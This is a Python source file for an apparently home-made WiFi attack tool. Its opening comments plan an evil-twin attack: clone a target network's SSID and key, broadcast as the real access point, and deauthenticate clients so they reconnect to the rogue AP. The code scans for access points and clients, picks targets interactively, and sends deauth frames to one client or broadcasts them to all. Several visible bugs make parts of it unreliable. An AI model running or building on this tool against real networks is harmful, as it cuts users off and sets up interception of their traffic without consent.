# Get SSIDS in wifi medium (scan network)

# Choose one SSID to emulate - e.g. based on WPA2, name, number of clients connected to it

# Can we crack the key in order to create our own AP? if not go to next..

# Create rogue AP with same SSID+key

# Send beacon frames where we look like good AP (but we are the bad AP)

# De-auth clients connected to SSID

# Let clients connect to our rogue AP

from scanner import Scanner
from utils import check_system
from wifi import Wifi
import sys
from deauth import deauth
from cli import prompt_menu, options

INTERFACE = check_system()
TIMEOUT = 20


def scan_network(scanner: Scanner) -> bool:
    print("Scanning network for APs...")
    AP_info = scanner.scan_for_aps(timeout=TIMEOUT)
    print(AP_info)
    # print(scanner.wifis)

    # scan network for clients as well
    print("Scanning network for clients...")
    scanner.scan_for_clients(timeout=TIMEOUT)
    print(scanner.get_clients())

    return True


def show_aps():
    # Check if we have scanned the network. If so, show APs from scanner.wifis
    if scanner.wifis:
        # Print APs in a nice way
        for i, wifi in enumerate(scanner.wifis):
            print(f"{i}. {wifi.SSID} - {wifi.BSSID}")
        
        # Prompt user if they want more info on AP
        more_info = input("Do you want more info on AP? (y/n): ").strip()
        if more_info == "y":
            AP_to_show = int(input("Input index of AP to show: "))
            print(scanner.wifis[AP_to_show])
        
    else:
        print("No APs found. Try scanning network first.")
        return False


def prompt_for_ap() -> Wifi:
    """
    Check if we have scanned the network. If so, we can prompt user for AP to attack from scanner.wifis
    Then in scanner.wifis find the AP with the same BSSID as the one we scanned for
    Then check if we found the AP
    """
    def _get_targeted_ap() -> Wifi:
        AP_to_attack_str = input("Input AP BSSID for client scan: ")
        print("Scanning network for selected AP...")
        scanner.scan_for_aps(timeout=TIMEOUT, specific_ap=AP_to_attack_str)
        # in scanner.wifis find the AP with the same BSSID as the one we scanned for
        for wifi in scanner.wifis:
            if wifi.BSSID == AP_to_attack_str:
                target_ap = wifi
                break
        # check if we found the AP
        if not target_ap:
            print("Could not find AP in scanned APs. Try scanning network first.")
            return False
        return target_ap

    if scanner.wifis:
        print("Choose AP from list: ")
        for i, wifi in enumerate(scanner.wifis):
            print(f"{i}. {wifi.SSID} - {wifi.BSSID}")
        print(f"{len(scanner.wifis)+1}. User defined AP")
        AP_to_attack = int(input("Input index of AP to attack: "))
        if AP_to_attack == len(scanner.wifis) + 1:
            target_ap = _get_targeted_ap()
        target_ap = scanner.wifis[AP_to_attack]
    else:
        print("No APs found. Try scanning network first.")
        return False
    return target_ap


def show_clients() -> bool:
    target_ap = prompt_for_ap()
    print(f"Extracting client list for AP: {target_ap.SSID}")
    # Get clients from AP
    if target_ap.clients:
        print("Clients on AP:")
        # Print clients using target_ap.get_clients(), shown as i. client.mac - ssid
        clients = target_ap.get_clients()
        for i, client in enumerate(clients):
            print(f"{i}. {client['MAC']} - {client['SSID']}")
    else:
        print("No clients found on AP.")
        # prompt if user wants to seach for clients on AP
        search_for_clients = input("Do you want to search for clients on AP? (y/n): ").strip()
        if search_for_clients == "y":
            scanner.scan_for_clients(timeout=TIMEOUT)
    return True


def send_deauth():
    target_ap = prompt_for_ap()
    scanner.set_channel(target_ap.channel)

    # Check if we have clients on the AP. If so, prompt user for client to deauth
    if target_ap.clients:
        print("Choose client to deauth from list:")
        for i, client in enumerate(target_ap.clients):
            print(f"{i}. {client}")
        print(f"{len(target_ap.clients)+1}. User defined client")
        print(f"{len(target_ap.clients)+2}. Deauth all clients")
        client_to_deauth = int(input("Input choice: "))

        if client_to_deauth == len(target_ap.clients) + 1:
            target_client = input("Input client MAC for deauth: ")
        elif client_to_deauth == len(target_ap.clients) + 2:
            target_client = "ff:ff:ff:ff:ff:ff"
        else:
            target_client = target_ap.clients[client_to_deauth]

    # If we don't have clients on the AP, prompt user for client to deauth
    else:
        target_client = input("Input client MAC for deauth: ")

    deauth(INTERFACE, target_ap.BSSID, target_client)


with Scanner(INTERFACE) as scanner:
    scanner = scanner
    # Clear screen
    print("\033c")
    # check if user wants to exit or presses ctrl+c
    try:
        start = True
        action = prompt_menu(welcome=True, start=True)
        while True:
            # Clear screen
            print("\033c")
            start = False
            if action == "a.1":
                scan_network()
            elif action == "a.2" or action == "b.2":
                show_clients()
            elif action == "b.1":
                show_aps()
            elif action == "b.3":
                send_deauth()
            elif action == "a.3":
                TIMEOUT, INTERFACE = options(TIMEOUT, INTERFACE)
                start = True
            elif action == "b.8":
                start = True
            elif action == "a.9" or action == "b.9":
                break
            else:
                print("Invalid input. Try again..")
            action = prompt_menu(start=start)
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
